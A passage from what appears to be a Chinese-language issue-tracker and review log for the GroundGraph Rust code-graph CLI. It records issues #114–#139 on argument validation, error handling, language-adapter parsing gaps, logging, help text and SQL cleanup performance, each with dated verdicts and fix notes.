> **✅ 已闭环（2026-06-13 第十轮，TDD）** — 成立。新增 clap `value_parser = non_empty_value`（trim 后空即报错）挂到 5 个位置参数：`TraceArgs.query`、`SliceArgs.requirement`、`ContextArgs.requirement`、`CandidateShowArgs.id`、`CandidateReviewArgs.id`。空串/纯空白在 parse 阶段即报 clap usage 错误（exit 2），不再静默喂进 engine 当零命中或触发下游 unwrap。TDD：`empty_positional_arguments_are_rejected`（5 命令空串 + 纯空白 `"   "` 全被拒，非空仍解析；修复前 RED）。

- **位置**：`crates/groundgraph-cli/src/main.rs:142`（`TraceArgs.query`）、`963`（`SliceArgs.requirement`）、`904`（`ContextArgs.requirement`）、`642/673`（`CandidateShowArgs.id`、`CandidateReviewArgs.id`）
- **问题**：所有这些位置参数都是 `String`（非 `Option`），clap 接受空串 `""` 当合法输入。例如 `groundgraph trace ""` 会把空 query 传进 engine，要么返回 0 命中（看似"什么都没找到"），要么触发底层 panic/unwrap。错误消息不告诉用户"query 不能为空"。
- **建议**：在 runner 入口加 `if query.trim().is_empty() { bail!("query 不能为空"); }`；或用 clap 的 `value_parser`。

### 115. `--format` 在 7 个命令上是裸 `String` 而非 `ValueEnum` — 错误消息分散、不本地化、大小写敏感不一

> **🟠 判定：成立·一致性重构留专项（2026-06-13 第十轮）** — 不一致属实，但把 7 处 `--format`（features/graph_diff/questions/select_tests/similar 等）从 `String`+runtime `bail!` 改成 `ValueEnum` 会**改变退出码语义**（user-input 错误从 anyhow 的 exit 1 变成 clap parse 的 exit 2），与 #233（typed exit codes）耦合，且每个命令的现有 `bail!` 错误消息测试需同步更新。属跨命令一致性重构，应与 #233 一并在专项 PR 落地，不在散修轮逐个动。
> **✅ 已闭环（2026-07-17，TDD）** — 7 处裸 `--format`/`--mode` String（features/graph-diff/questions/select-tests/similar format + similar mode）改为 clap `ValueEnum`：非法值在 parse 阶段即 exit 2（与 #233 契约一致），不再走 per-command 运行时 `bail!`（旧 exit 1/70）。共享 `commands::output::TextJsonFormat` + `TextJsonFormatArg`/`SimilarModeArg` ValueEnum + From 转换；similar.mode 直接转 engine `SimilarityMode`（删 `parse_mode`）。TDD：`tests/format_value_enum.rs`（similar-mode / graph-diff parse 失败 RED 驱动 + 5 命令非法值守护 + 合法值正控）。

- **位置**：
  - 裸 String + 运行时 `bail!`：`features.rs:33`、`graph_diff.rs:35`、`questions.rs:27`、`select_tests.rs:48`、`similar.rs:62`（format）、`similar.rs:72`（mode）、`graph_diff.rs:412`（format）
  - ValueEnum：`graph`、`search`、`impact`、`candidate show`、`propose`、`business-doc`
- **问题**：(1) 错误消息分两派：ValueEnum 派由 clap 在 parse 阶段给出标准错误（exit 2）；String 派在 runner 里 `bail!`，英文/中文混杂；(2) String 派大小写敏感（`--format JSON` 会被拒），ValueEnum 派默认不敏感；(3) String 派错误退出码是 1（anyhow 走 main 的 `Err` 分支），ValueEnum 派是 2（clap parse 错误）。脚本无法靠退出码区分"user input error"vs"runtime error"。
- **建议**：统一改成 `ValueEnum`。

### 116. 缺少 `groundgraph doctor` 环境诊断命令

> **🟠 判定：成立·功能增量留专项（2026-06-13 第十轮）** — 属实但是**新功能**：需新增 `doctor` 子命令逐项探测 `git`/各 SCIP 二进制/LSP/`graph.db`/配置可解析性。价值高（解释"某语言 0 符号"是缺工具还是无代码），但属独立功能 PR。
> **✅ 已闭环（2026-07-17，TDD）** — 新增 `groundgraph doctor`：逐项探测 `git`（必需）/ `.groundgraph.yaml` 可解析 / `graph.db` 存在（必需，✗→exit 2）/ SCIP indexers / Dart SDK / sourcekit-lsp（可选，信息性 ✓），每项 `✓`/`✗` + 可操作建议 + `Doctor: N check(s), M failed.` 汇总；有必需 ✗ 按 #233 返回 2。TDD：`tests/doctor.rs`（空仓 config/db ✗→exit 2；init 仓报全部检查项 + 汇总）。

- **位置**：整个 CLI 无 `doctor`/`diagnose`/`env` 命令
- **问题**：GroundGraph 依赖一堆外部工具：`sourcekit-lsp`、`scip-typescript`、`scip-java`、`scip-go`、`git`、`tree-sitter`。当 index 跑出来的某个语言是 0 符号，用户完全不知道是"代码为空"还是"LSP/SCIP 没装"。现在只能靠 `index` 输出里零散的 `LSP skipped: ...` 行去拼凑诊断信息。
- **建议**：新增 `groundgraph doctor`：检查 `git --version`、各 SCIP 二进制是否在 PATH、`.groundgraph/graph.db` 是否能打开、`stats.jsonl` 大小、配置文件 parse 是否 OK，逐项打勾/打叉。

### 117. `dead_code::swift_framework_instantiated_types` 的递归 DFS `reaches` 在 memo 缓存 false 时脆弱

> **🟡 判定：不成立（误报 + 吹毛求疵，2026-06-13 第九轮）** — (2) "`break` 后 `stack.remove(name)` 不执行"是**误报**：`break` 只跳出内层 `for`，控制流落到 line 873 的 `stack.remove(name)`，无 stack 残留。(1) 单次调用内 `supers`/`bases` 不可变，false 缓存正确，issue 自己也承认"其实安全"——属吹毛求疵。doc 注释已说明"with a recursion stack guarding"。不改。

- **位置**：`crates/groundgraph-engine/src/dead_code.rs:848-876`
- **问题**：`reaches` 使用 `stack` 防循环 + `memo` 缓存结果。`memo.insert(name, hit)` 在 `hit=false` 时也缓存。在单次调用内 supers map 不会变，所以这其实安全，但代码可读性差且**脆弱**——未来若 supers 在递归过程中变化（如添加新边），false 缓存会让漏报。`stack.remove(name)` 在 `hit=true` 提前 break 后**没有执行**（line 869-871 break 出 for 循环后直接到 line 873），stack 残留 name。
- **建议**：把 memo 缓存范围限制为 `hit==true`（false 不缓存，因为 stack 状态可能影响），或加注释明确"单次调用内 supers 不可变"。

### 118. `feature_pack::WIDE_CAP = 100_000` 在 constants 子查询中传给 `max_sites_per_entry`，超大仓库会静默截断且重写 occurrences

> **🟡 判定：基本不成立（按设计，2026-06-13 第九轮）** — (a) 建议的"传 `max_sites_per_entry: 0`（无限）"**在本实现中是反的**：`constants.rs:171` 是 `if entry.sites.len() < max_sites_per_entry`，传 0 → `len() < 0` 永假 → 一个 site 都不 push，scoped 结果全空。0 在此**不等于无限**。(b) `e.occurrences = e.sites.len()`（line 305）在 `retain` 到 scope_files 之后执行，是 **scoped 视图的正确语义**（按特性范围计数，而非全局）。(c) WIDE_CAP=100k 是内存防护，单个字面量在一个特性范围内出现 10 万次不现实。不改。

- **位置**：`crates/groundgraph-engine/src/feature_pack.rs:101, 293, 305`
- **问题**：`scoped_constants` 调用 `analyze_constants_with_store` 时传 `max_sites_per_entry: WIDE_CAP`（100k）。constants 模块在 `entry.sites.len() < max_sites_per_entry` 时才 push site——100k 看似安全，但一个跨整个 alarm 模块的常量（如颜色码 `0xFF6236FF` 在 1000 个文件中出现 5000 次）会被截断到 100k，而 `occurrences` 字段继续累加。结果：`scoped_constants` 重算 `e.occurrences = e.sites.len()`（line 305）时把 occurrences **重置为截断后的 sites 长度**，stats 中的 `constants` 计数与真实出现次数不符。
- **建议**：不要重写 `e.occurrences`；或传 `max_sites_per_entry: 0`（无限）给 constants 子查询。

### 119. `questions::has_real_users` 孤儿符号判定遗漏 `DeclaresImplementation` 入边，interface 的实现方法被误报为孤儿

> **✅ 已闭环（2026-06-13 第九轮，TDD 修复）** — 成立。`has_real_users` 的 match 加入 `EdgeKind::DeclaresImplementation`（incoming_kinds 按 `edge.to_id` 建，interface→impl 边使 impl 持有该入边）。新增测试 `questions::tests::interface_implementation_is_not_surfaced_as_orphan`：构造 interface→impl 的 `DeclaresImplementation` 边，断言 impl 不再被报为孤儿（修复前 RED）。

- **位置**：`crates/groundgraph-engine/src/questions.rs:154-169`
- **问题**：`has_real_users` 检查的入边种类包括 Calls/References/Imports/ReadsProvider/NavigatesTo/PersistsTo/SubscribesStream，但**不含 `DeclaresImplementation`**。一个 Java `DictSystemServiceImpl.queryById` 方法有来自接口 `DictSystemService` 的 `DeclaresImplementation` 边（由 schema_indexer 的 interface→impl 链接产生），但仍可能被报为孤儿——因为接口本身可能没有入边。dead_code 把 `DeclaresVerification` 算作 usage edge（dead_code.rs:655-667），但 questions 没有对称处理 `DeclaresImplementation`。
- **建议**：在 `has_real_users` 的 match 中加入 `EdgeKind::DeclaresImplementation`。

### 123. Rust adapter 不识别 `macro_rules!` 定义，宏规则完全不进入符号图

> **🟠 判定：成立·需专项（2026-06-13 第九轮，未在本轮散修）** — 现状属实（`rust_container_of`/`rust_is_callable` 均不含 `macro_definition`）。但"接通"是一项**带涟漪的功能增量**而非散修：需新增 `NodeKind::RustMacro`（牵动 `node.rs` 的 `ALL`/`as_str`/`language()`/分类 + `search_aliases` + #208 全枚举测试），且**只发节点不发宏调用边会让每个宏永远零入边 → 被 dead-code 误报为死**，反而劣化。正确做法须同时解析 `macro_invocation` 形成 `Calls` 边并补 fixture。列为独立 PR。
> **✅ 已闭环（2026-07-17，TDD）** — 新增 `NodeKind::RustMacro`（同步 `ALL`/`as_str`/`language()`/`family_of`/`search_aliases` + #208 全枚举 round-trip，matrix 计数 82→83）；`rust_container_of` 识别 `macro_definition` 发 RustMacro 节点，`RUST_CALL_KINDS` 新增 `macro_invocation` CallKind 发 Calls 边指向宏节点（避免零入边被 dead-code 误报）。单测 `macro_rules_definition_emits_rust_macro_node` / `macro_invocation_emits_call_to_the_macro_name`；端到端 `p22::rust_macro_in_use_is_not_a_dead_code_false_positive`（被调用宏可达不被误报，未调用宏仍报死）。

- **位置**：`crates/groundgraph-engine/src/rust_treesitter.rs:30-38`（`rust_container_of`）与 `40-42`（`rust_is_callable`）
- **问题**：`rust_container_of` 只识别 `struct_item`/`union_item`/`enum_item`/`trait_item`/`mod_item`；`rust_is_callable` 只识别 `function_item`/`function_signature_item`。tree-sitter-rust 把 `macro_rules! foo { ... }` 解析为 `macro_definition` 节点——既不是 `container` 也不是 `callable`，被 `walk` 漏过。在重度依赖 `macro_rules` 的 crate（`serde`、`tokio`、`thiserror`、`proc-macro` 工作区），宏规则是不可寻址的黑盒，dead-code 无法判断宏是否被使用。
- **建议**：在 `rust_container_of` 增加 `"macro_definition" => Some(SymKind::Type(NodeKind::RustMacro))`（需新增 `NodeKind::RustMacro`），或在 `rust_is_callable` 中识别它。

### 124. `resolve_heuristic_refs` 的 `MAX_REF_TARGETS` 截断发生在 dedup 之前，可能丢真边留重复

> **✅ 已闭环（2026-06-13 第九轮）** — 成立。改为**先去重再截断**：最终循环用 `local_seen`（按 `to_id+kind`）跳过重复目标，仅当唯一目标计数超过 `MAX_REF_TARGETS` 才 break，全局 `seen` 仍负责跨 ref 去重。重复 import 解析到同一定义不再消耗预算、不再饿死第 17+ 项真边。逻辑为明确的顺序修正；由各语言跨文件引用集成测试覆盖回归（该私有多 map resolver 难以单测构造 >16 重复目标场景）。

- **位置**：`crates/groundgraph-engine/src/treesitter.rs:1815-1823`
- **问题**：对每个 `pending ref`，先收集 `targets: Vec<(...)>`（可能含重复，因为同文件多 `import` 解析会 push 同一 `(tf, tq, kind)` 多次），再 `take(MAX_REF_TARGETS)`（16），**最后**才 `seen.insert` 去重。如果 `targets` 有 20 项且前 16 项里有 10 个重复，那么 `take(16)` 截断后只剩 6 个唯一项 + 10 个重复，dedup 后只剩 6 条边；而第 17-20 项（可能是唯一真边）永远看不到。正确顺序应是先 dedup 再 `take`。
- **触发场景**：同文件多个 `import` 都解析到同一目标文件（Go 包级别 `import`、Java wildcard），且被调用的名字在该文件有 >16 个候选定义。
- **建议**：把 `seen.insert` 移到 `take` 之前——即边收集边去重，达到 `MAX_REF_TARGETS` 个**唯一**目标即停。

### 125. C# adapter 不识别 LINQ `query_expression` 与 `partial class` 跨文件合并语义

> **🟠 判定：成立·需专项（2026-06-13 第九轮，未在本轮散修）** — 两点均属实。(1) LINQ `query_expression` 子句调用未进调用图；(2) `partial class` 跨文件是两个 `csharp::<file>::Foo` 节点。修复需在 `collect_csharp_calls` 加 `query_expression` 分支并对 lambda body 递归，且对 `partial` 类做跨文件 qualified-name 合并（或在 `resolve_heuristic_refs` 内合并）——涉及解析器语义 + 需真实 ASP.NET/EF fixture（见 #238）回归。列为独立 PR。
> **✅ 已闭环（2026-07-17，TDD）** — (1) LINQ `query_expression` 内的调用由 `collect_calls` 无条件递归天然捕获（`select helper(x)` 的 invocation_expression），以 `linq_query_expression_calls_are_captured` 单元测试锁定；(2) `partial class` 跨文件合并：新增 `LangSpec::partial_class_merge`（仅 C# 开启，其余 12 个 spec 显式 false），`resolve_heuristic_refs` 对 bare name 同文件/import 失败后回退 module-wide 查找，约束目标 owning-type 前缀与调用者一致（同一 partial 类的同伴文件）。`breadth_fixtures_golden::csharp_linq_query_expression_and_partial_class_merge_resolve_helper` 金标回归（RenderActive → helper 边同时验证 LINQ 捕获与 partial 合并）。

- **位置**：`crates/groundgraph-engine/src/csharp_treesitter.rs:31-43`（`csharp_container_of`）与 `197-242`（`csharp_call_idents`）
- **问题**：(1) LINQ 查询 `var q = from x in xs where x.Y > 0 select x.Z;` 在 tree-sitter-c-sharp 中是 `query_expression`，其 `from`/`where`/`select` 子句的方法调用（`Where`/`Select` 是 `Enumerable` 扩展方法）不会被 `collect_csharp_calls` 捕获——它只识别 `invocation_expression`。LINQ 是 C# 业务代码的主流数据流写法，丢失它意味着所有 `where`/`select`/`join` 链路上的 lambda 调用都不进入调用图。(2) `partial class Foo` 分散在多个 `.cs` 文件：每个文件都 emit 一个 `CSharpClass Foo`，`symbol_id` 是 `csharp::<file>::Foo`，所以同一逻辑类的两部分在图中是两个节点，跨文件的 `partial` 方法调用无法解析。
- **建议**：(1) 在 `collect_csharp_calls` 增加 `query_expression` 分支；(2) 对 `partial` 修饰符的 `class`，`qualified name` 追加文件名后缀，或在 `resolve_heuristic_refs` 中对 `CSharpClass` 做 `partial` 合并。

---

### Low（4 个）

### 126. `tool/groundgraph_dart_analyzer/lib/walker.dart` 的 `Directory.systemTemp.createTemp('groundgraph_opts_')` 临时目录永不删除

> **✅ 已闭环（2026-06-13 第十三轮，TDD）** — 部分成立（"永不删除"陈述已过时）：walker.dart 早有 best-effort `optionsDir.deleteSync(recursive)`，happy path 不泄漏；真实残留缺口是**异常路径**未保证清理（如某文件的 `visitChildren` 抛出）。现把"建临时目录 → 两遍分析 → 返回"整体包进 `try { … } finally { optionsDir.deleteSync }`（`dart format` 重排缩进、`dart analyze` 干净），任何中途抛出也回收。TDD：`walkRepository does not leak its options temp dir`（walk 前后 systemTemp 里 `groundgraph_opts_*` 目录计数不变）。

- **位置**：`tool/groundgraph_dart_analyzer/lib/walker.dart:167-169`
- **问题**：第 167 行 `final optionsDir = await Directory.systemTemp.createTemp('groundgraph_opts_');` 创建临时目录（如 `/tmp/groundgraph_opts_XYZABC/`），里面写一个 `analysis_options.yaml`。但**整个 walker.dart 没有 `optionsDir.delete(recursive: true)` 回收**——函数返回或异常时，临时目录留在 `/tmp`。`tool/groundgraph_dart_analyzer/bin/groundgraph_dart_analyzer.dart` 也没有顶层 try/finally 清理。Rust 端 `dart_sidecar::try_run` 每次 `groundgraph index` 都会调用 sidecar，大型项目一次 index 可能解析上千个 Dart 文件、跨多次 sidecar 调用——`/tmp` 累积大量 `groundgraph_opts_*` 目录。
- **建议**：`try { ... } finally { await optionsDir.delete(recursive: true); }`；或用 `package:timing/timing.dart` 的 `withTempDir` helper。

### 127. 缺少 `--verbose` / `--quiet` / `RUST_LOG` 全局日志控制

> **🟠 判定：成立·可观测性专项（2026-06-13 第十轮）** — 属实但是**架构级功能增量**：引入 `tracing`+`tracing-subscriber`、全局 `-v/-q` flag、在长操作发 `info!` 进度。与 #231（index 进度反馈）同源，应作为可观测性专项一并设计，不在散修轮落地。
> **✅ 已闭环（2026-07-17，TDD）** — workspace 引入 `tracing`+`tracing-subscriber`(env-filter)+`indicatif`；`Cli` 加 global `-v`(Count)/`-q` flag，新建 `logging.rs`：纯函数 `log_directive` 按 verbosity 映射 EnvFilter（默认 warn / `-v`=info / `-vv`=debug / `-q`=error / `RUST_LOG` 优先），`main`→`run` 早期 init，输出强制 stderr；engine/store 只发事件不 init。TDD：`logging::log_directive` 9 例（RED→GREEN）+ `help_grouping` 的 `-v`/`-q` e2e。与 #230/#231/#234 同批落地。

- **位置**：`crates/groundgraph-cli/src/main.rs:17-24`（`Cli` 只有 `repo_root` 和 `command`），全仓 `grep -rn 'RUST_LOG\|tracing_subscriber\|env_logger\|--verbose\|--quiet'` 0 命中
- **问题**：当 `index` 慢或 `trace` 截断时，用户没有办法看进度/调试输出。引擎里大量 `.context(...)` 错误链通过 `eprintln!("groundgraph: {err:#}")` 只打最外层；要排错只能改源码加 `dbg!`。`RUST_LOG=debug groundgraph index` 完全无效。大型仓库（spring-framework）索引 10s+ 也没有任何进度反馈。
- **建议**：加全局 `--verbose`/`-v` 和 `--quiet`/`-q` flag；引入 `tracing` + `tracing-subscriber`，在 `main()` 初始化时按 verbosity 设 filter；长操作（index、trace、port-coverage）发 `info!` 进度事件。

### 128. `--help` 输出在 36 个子命令上无分类（无 `help_subcommand`/`flattened` 分组），且大多数子命令 help 缺示例

> **🟠 判定：成立·UX 打磨留专项（2026-06-13 第十轮）** — 属实但是 help 文案/分组打磨：给 36 个子命令逐个加 `help_heading` 分组 + 高频命令补 `Examples:` 块，机械但量大，属 UX 专项 PR，非缺陷。
> **✅ 已闭环（2026-07-17，TDD）** — clap（`default-features = false`）不支持 subcommand 变体的 `help_heading`（`Command::help_heading` method 不存在），改用顶层 `after_help` 加「Commands by category」分组索引（Setup/Query/Graph/Analysis/Business/Migration/Telemetry 覆盖全部 37 子命令）+ 退出码提示；高频命令（index/search/impact）用 `#[command(long_about = "…\\n…")]` 补多行 `Examples:` 块（doc comment 连续行被 clap 合并成单行，显式 `long_about` 字符串才保留换行）。TDD：`tests/help_grouping.rs`（顶层 --help 含分组标题；index/search/impact --help 含 Examples）。

- **位置**：`crates/groundgraph-cli/src/main.rs:26-137`（所有子命令平铺在一个 `enum Commands`）
- **问题**：跑 `groundgraph --help` 时，36 个子命令一字排开（init / index / slice / impact / check / context / connect / export / graph / candidate / logic / propose / business-doc / search / dead-code / similar / select-tests / features / graph-diff / questions / dashboard / facts / purity / constants / contract / port-coverage / route-coverage / graph-equiv / schema-index / suggest-tests / feature-pack / stats / trace），用户找不到入口。每个子命令的 help 虽然列了 flag，但没有 `Examples:` 段。`trace` 注释里写了一大段"controller→service→impl→mapper→SQL→table"但 `--help` 不显示 doc comment 全文。
- **建议**：(1) 用 clap 的 `help_heading` 把子命令分组（"Setup" / "Query" / "Diff" / "Business" / "Migration" / "Quality" / "Reports"）；(2) 给前 5 个高频命令的 doc comment 加 ```text``` 示例块。

### 130. `collect_*_calls` 各 adapter 重复实现 12 次，缺少 trait/宏抽取，新增语言易遗漏 callee kind

> **🟠 判定：成立·待专项（2026-06-13 第十四轮·Wave D，已验证）** — 成立（可维护性）。12 个 adapter 各写一个结构近似的 `collect_<lang>_calls` 递归收集器属实。但抽取共享骨架 `collect_calls_generic(.., call_kinds: &[(&str, CallNameFn)])` 是触及**解析核心**的跨 12 文件重构：每种语言的 call 节点形态/callee 取名细节各异（Kotlin `?.`、Swift trailing-closure、TS optional-chaining…），合并需逐语言对照 tree-sitter grammar 并补"每 adapter 覆盖全部 call 形态"的统一测试，否则极易回归。属设计性重构，需独立 PR + 每语言金标，不在散修轮处理。

> **✅ 已闭环（2026-07-17，TDD）** — 成立·已修。抽 `treesitter::collect_calls(node, src, out, depth, &[CallKind])` 共享骨架（`MAX_NESTING_DEPTH` 截断 + `named_children` 遍历 + 永远递归——12 份 `collect_<lang>_calls` 的唯一不变部分）到 `treesitter.rs`；各 adapter 只声明 `static <LANG>_CALL_KINDS: &[CallKind]`（kind → 提取器对，提取器接收 call 节点返回 `(name, RefKind)`）并调骨架，删掉 12 份手写递归，`depth` 截断逻辑从此只此一处。每语言可变形态**无损**保留：Rust/Python(`call`)/Kotlin(`named_child(0)`+navigation)/Ruby(`call`+`new` 双分支)/C 单 kind、TS/Go/Java/C#/Cpp 双 kind（`new`→`Reference`）、Swift 三 kind（`type_identifier`+`navigation_expression` 含 upper-case 条件）、PHP 四 entry（`member_call`/`scoped_call` 共享 extract）；C 的 `preproc_arg` 宏替换文本扫描仍留 `c_call_idents` 入口（预处理器无 AST，不进骨架）。TDD 先红 `collect_calls_walks_registered_kinds_and_always_descends` + `collect_calls_with_empty_kinds_is_a_clean_noop`（自包含、驱动 Rust grammar）再实现；calls 边产出逐字节不变由各 adapter 金标守护（rust `captures_same_file_call_identifiers`/`captures_method_and_scoped_call_identifiers`、python `captures_bare_attribute_and_construction_calls`/`captures_module_level_and_class_body_references`、ts `captures_bare_and_member_call_identifiers`/`captures_constructor_references`、go `captures_call_and_construction_identifiers`、kotlin `captures_calls_and_constructions`、swift `captures_bare_navigation_and_construction_calls`/`captures_type_references_in_annotations_metatypes_and_casts`、java `captures_invocation_and_object_creation`、csharp `captures_invocations_and_object_creation`、php `captures_calls_and_object_creation`、ruby `captures_calls_and_constant_construction`、c `captures_bare_and_function_pointer_calls`/`function_like_macros_are_callable_symbols_with_outbound_calls`、cpp `captures_simple_member_qualified_and_new_calls`）+ `every_language_spec_opts_into_the_call_resolver` 守门。门禁 fmt / clippy(`-D warnings`) / test --workspace 全绿。

- **位置**：`rust_treesitter.rs:321`、`python_treesitter.rs:289`、`go_treesitter.rs:212`、`java_treesitter.rs:199`、`csharp_treesitter.rs:203`、`php_treesitter.rs:198`、`ruby_treesitter.rs:216`、`c_treesitter.rs:175`、`cpp_treesitter.rs:159`、`swift_treesitter.rs:338`、`typescript_treesitter.rs:258`、`kotlin_treesitter.rs:225`
- **问题**：12 个 adapter 各自手写一个 `collect_<lang>_calls(node, src, out, depth)` 递归收集器，结构几乎相同（遍历 `named_children`、match call 节点 kind、递归 `depth+1`、`depth > MAX_NESTING_DEPTH` 截断）。差异仅在"哪种节点是 call、callee name 怎么取"。这种重复意味着：(1) 新增语言时容易忘记某类 callee（如 Kotlin 的 `safe_call_expression` `?.`）；(2) `depth` 截断逻辑修一次要改 12 处；(3) 无统一测试证明每个 adapter 的 `collect` 都覆盖了该语言全部 call 形态。
- **建议**：抽取 `fn collect_calls_generic(node, src, out, depth, call_kinds: &[(&str, CallNameFn)])` 共享骨架，各 adapter 只提供 `(node_kind, name_extractor)` 对。

## 总览

**本文件活跃问题：53 个**（第三批 13 + 第四批 40）。

| 来源 | 编号范围 | 活跃数 | 严重度分布 (H/M/L) |
|---|---|---|---|
| 第三批续审 | #61–#80（部分） | 13 | 6 / 7 / 0 |
| 第四批扩展 | #81–#130（部分） | 40 | 12 / 24 / 4 |
| **本文件小计** | **#61–#130** | **53** | **18 / 31 / 4** |
| [issues3.md](issues3.md) 第五批 | #131–#180 | 50 | 15 / 30 / 5 |
| **活跃总计** | **#61–#180** | **103** | **33 / 61 / 9** |

**已归档**（完整审查记录 + verdict 见各归档文件）：

| 归档文件 | 编号 | 数量 | 状态 |
|---|---|---|---|
| [issues.md](issues.md) | #1–#30 | 30 | 第一批，已处理 |
| [issues2-archive.md](issues2-archive.md) | #31–#60 | 30 | 第二批，已处理 |
| [issues2-archive.md](issues2-archive.md) | #61–#130 中 18 项 | 18 | 2026-06-13 复核处理（修复 10、误报 5、按设计 3） |

### 132. README 与白皮书对 TypeScript 编译器仓库冷索引耗时自相矛盾（52s vs 28s）

> **✅ 已闭环（2026-06-13 第十二轮）** — 成立。`README.md` 与 `README.zh-CN.md` 的 TS 编译器冷索引数字 `~52s`/`约 52 秒` 统一改为白皮书 §2.2 权威基准 `~28s`/`约 28 秒`，消除对外自相矛盾；白皮书为单一真相源、README 引用之。

- **位置**：`README.md:45`、`README.zh-CN.md:45`、`docs/whitepaper-zh.md:128`
- **问题**：README 两份都写 "TypeScript compiler repo (20k+ files) in **~52s**"，而白皮书 §2.2 性能基准表写 "~28s"。同一仓库、同一规模、同一工具，对外宣称相差近一倍。任一数字都让用户无法判断预期性能；同时 `git log` 显示近期 commits `2ed27bc` (TypeScript 24s→16s) / `0207fc5` (spring 18.6s→10.3s) 都在做性能优化，单点数字很快会再次过时。
- **建议**：选定一个权威数字（建议取白皮书 28s，并标注"含解析预算与并行分词"），README 与白皮书同步更新。

### 133. `dist/groundgraph-0.2.0-macos-universal/README.md` 严重滞后：把已退役的 LSP 列为精度层，未提 SCIP overlay

> **✅ 已闭环（2026-06-13 第十二轮）** — 成立。dist README 的真实源是 tracked `packaging/macos/README.md`（release 脚本 `cp` 之；`dist/` 本身未入库）。其 "Supported languages" 的 LSP 精度表（gopls/pyright/typescript-language-server/jdtls）按 ADR-0001 §8.8 重写为当前模型：广度 tree-sitter 12 门 + Dart sidecar + 可选 SCIP overlay 精度层；删除废弃的 `typescript: lsp_command:` 示例，补"LSP tier 已退役、`lsp_command` 被忽略"提示。与主 README 语言矩阵对齐。

- **位置**：`dist/groundgraph-0.2.0-macos-universal/README.md:35-74`
- **问题**：dist README 的 "Supported languages (0.2.0)" 表把 Swift/Go/Python/TypeScript/Java 的精度来源列成 LSP（gopls、pyright、typescript-language-server、jdtls），并指导用户编辑 `.groundgraph.yaml` 的 `typescript: enabled: true / lsp_command: ...` 块。但 `crates/groundgraph-engine/src/config.rs:43-74` 明确：**Go/Python/TS/Java 的 LSP tier 已于 ADR-0001 §8.8 退役**，精度来源是 SCIP overlay。`crates/groundgraph-cli/src/commands/index.rs:204-206` 的注释也复述了这一点。dist README 还：完全没提 SCIP overlay（现在的精度来源）；漏列 Rust / C / C++ / C# / Ruby / PHP / Kotlin 七门 tree-sitter 语言；指导用户写已 deprecated 的 `typescript:` per-language 块。
- **触发场景**：用户从 macOS .tar.gz 包安装后照 dist README 配置，写出来的 `.groundgraph.yaml` 不会启用 SCIP，且 `lsp_command` 字段会被忽略（config.rs 明示 "shared lsp_command field is ignored"），用户困惑"为什么开了 LSP 没效果"。
- **建议**：dist README 与 src README 共享一份"语言 + 精度层"矩阵。

### 137. `clear_indexer_outputs` 的孤儿清理对每 indexer 都重扫全 `nodes` 表（N×全表扫）

> **🟠 判定：成立·待专项（2026-06-13 第十四轮·Wave D，已验证）** — 成立。`clear_indexer_outputs` 末尾 3 条 `… NOT IN (SELECT id FROM nodes)` 对每 indexer 各做一次全 `nodes` 反半连接，本轮确认它被 ~20 处调用（`index.rs` 7 处 + 各语言 indexer + `scip_overlay`/`schema_indexer`，散落而非单一编排点）。两条修法都需专项：(a) 移到 ingest 末尾一次性 sweep——但调用点分散在多入口（含 `scip`/`schema` 独立命令路径），需保证每入口都补且**仅**补一次 `sweep_orphans()`，是 ingest 契约变更；且当前的全表 `NOT IN` 兼作**自愈 GC**（清理历史崩溃残留的任意孤儿），按 indexer 删除集缩小作用域会丢这层自愈。(b) 改为按"刚删除的 node id 集"`IN (...)` 删除——避免全表扫，但同样丢自愈 GC，且大 indexer 的 id 集需物化。risk 集中在最热的 ingest 路径，列为专项。

> **✅ 已闭环（2026-07-17，TDD）** — 成立·已修。把孤儿清理（`evidence`/`symbol_ranges`/`node_fts` 的 `… NOT IN (SELECT id FROM nodes)`）从 `clear_indexer_outputs` 拆出为独立 `Store::sweep_orphans() -> StoreResult<usize>`；`clear_indexer_outputs` 只删该 indexer 自有的 `nodes`/`edge_assertions` 行（二者有 `indexer` 列；`evidence`/`symbol_ranges`/`node_fts` 无 `indexer` 列，本就只能靠 sweep 回收）。sweep 保持原全表 `NOT IN` 语义（仍兼作自愈 GC，未缩小作用域）。两个 ingest 入口各在末尾恰好调一次：`index_repository`（bulk 事务内、fulltext rebuild 之后、`commit_bulk` 之前——覆盖 docs/dart×2/rust/treesitter-loop/links/requirements 直接 clear + 各 per-language adapter 自清 + `scip_overlay` 全部）；`index_schema_into`（独立 store 会话，`Ok(stats)` 之前）。`scip_overlay` 与各 per-language indexer 均为 `index_repository` 的子调用（grep 确认无独立 CLI 入口），故不另加 sweep。一次 `groundgraph index`（非 docs-only）= 2 次 sweep（两入口各一），旧为 N≈20×全表扫。TDD：先红 4 测再实现——`clear_indexer_outputs_scopes_to_indexers_own_rows_and_leaves_orphans`、`sweep_orphans_drops_orphaned_fulltext_rows_left_by_clear`、`sweep_orphans_removes_every_orphan_kind_and_keeps_resolving_rows`、`ingest_clears_orphans_once_via_sweep_not_once_per_clear`（10k 节点表跑 20 次 clear 断言孤儿计数不变、单次 `sweep_orphans` 返回 3 后归零——以计数证明全程只扫一次而非 N×全表扫，不依赖 rusqlite trace）。

- **位置**：`crates/groundgraph-store/src/repositories.rs:452-471`
- **问题**：在一次 `index_repository` 里，`clear_indexer_outputs` 被调用 5+ 次（docs、dart、dart_analyzer、swift、go…）。每次都跑：
  ```sql
  DELETE FROM evidence WHERE artifact_id NOT IN (SELECT id FROM nodes);
  DELETE FROM symbol_ranges WHERE symbol_id NOT IN (SELECT id FROM nodes);
  DELETE FROM node_fts WHERE node_id NOT IN (SELECT id FROM nodes);
  ```
  每个 `NOT IN (SELECT id FROM nodes)` 子查询都要把 `nodes` 表全部走一遍（django 96k 行）做反半连接。在 N 次 clear 调用上这是 N×(全表扫)，毫无用处——因为前一个 indexer 的 DELETE 已改变结果，但更关键的是这些清理**只跟本次 DELETE 的行有关**，而 SQL 实际上是"扫整库找孤儿"，跟本次调用无关。
- **建议**：把孤儿清理抽出 `clear_indexer_outputs`，改为 ingest 末尾一次性扫描；或者改成基于刚刚删除的 ID 的 `IN (...)` 列表。

### 139. 缺少 `PRAGMA foreign_keys=ON` —— FK 约束从未生效（schema 也没声明）

